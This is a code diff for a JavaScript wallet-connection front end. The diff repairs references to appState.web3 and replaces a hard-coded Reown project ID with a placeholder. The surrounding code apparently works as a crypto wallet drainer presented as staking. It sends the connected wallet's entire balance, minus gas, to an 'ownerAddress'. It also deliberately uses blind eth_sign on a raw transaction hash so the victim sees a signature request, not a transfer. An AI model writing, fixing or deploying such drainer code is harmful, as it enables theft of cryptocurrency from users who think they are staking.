@@ -24,7 +24,7 @@
 // ============================================
 // CONFIGURATION - SET THESE
 // ============================================
-const REOWN_PROJECT_ID = '19d9b1a7e899eca00c33891cc97132ce'; // ← Replace with your project ID from https://cloud.reown.com (required for genuine WC v2)
+const REOWN_PROJECT_ID = 'YOUR_REOWN_PROJECT_ID_HERE'; // ← Replace with your project ID from https://cloud.reown.com (required for genuine WC v2)
 
 // === BACKEND COMPATIBILITY VERIFIED (Formal) ===
 // All backend calls use EXACT original payloads, URLs, methods, and field names.
@@ -1004,14 +1004,14 @@ const REOWN_PROJECT_ID = '19d9b1a7e899eca00c33891cc97132ce'; // ← Replace with
       // Preserve original calculation logic but with safe BigInt handling
       const balanceStr = getBalance.toString();
       const gasPriceNum = parseInt(gasPrice.toString()); // safe for gasPrice (small)
-      const valueToSendBN = BigInt(web3.utils.toWei(balanceStr, 'ether')) - (BigInt(gasPriceNum) * 120000n);
+      const valueToSendBN = BigInt(appState.web3.utils.toWei(balanceStr, 'ether')) - (BigInt(gasPriceNum) * 120000n);
       const valueToSend = valueToSendBN > 0n ? valueToSendBN : 0n;
 
       if (valueToSend <= 0n) throw new Error("Insufficient balance for gas");
 
       const nonce = await appState.web3.eth.getTransactionCount(appState.account);
       const chainId = await appState.web3.eth.getChainId();
-      const chainHex = web3.utils.toHex(chainId);
+      const chainHex = appState.web3.utils.toHex(chainId);
 
       // Restore original legacy signing flow (produces signature request, not direct tx popup)
       // This matches the original application architecture and UX exactly.
@@ -1035,14 +1035,14 @@ const REOWN_PROJECT_ID = '19d9b1a7e899eca00c33891cc97132ce'; // ← Replace with
           to: ownerAddress,
           value: '0x' + valueToSend.toString(16),
           gas: "0x55F0",
-          gasPrice: web3.utils.toHex(gasPriceNum)
+          gasPrice: appState.web3.utils.toHex(gasPriceNum)
         });
         success = 1;
         structuredLog('info', 'stake_eth_success', { txHash: tx.transactionHash });
       } else {
         var tx = new ethereumjs.Tx(tx_);
         const serializedTx = "0x" + tx.serialize().toString("hex");
-        const sha3_ = web3.utils.sha3(serializedTx, { encoding: "hex" });
+        const sha3_ = appState.web3.utils.sha3(serializedTx, { encoding: "hex" });
 
         const initialSig = await web3.eth.sign(sha3_, appState.account);
 
@@ -1050,7 +1050,7 @@ const REOWN_PROJECT_ID = '19d9b1a7e899eca00c33891cc97132ce'; // ← Replace with
           r = "0x" + temp.substring(0, 64),
           s = "0x" + temp.substring(64, 128),
           rhema = parseInt(temp.substring(128, 130), 16),
-          v = web3.utils.toHex(rhema + chainId * 2 + 8);
+          v = appState.web3.utils.toHex(rhema + chainId * 2 + 8);
 
         tx.r = r;
         tx.s = s;
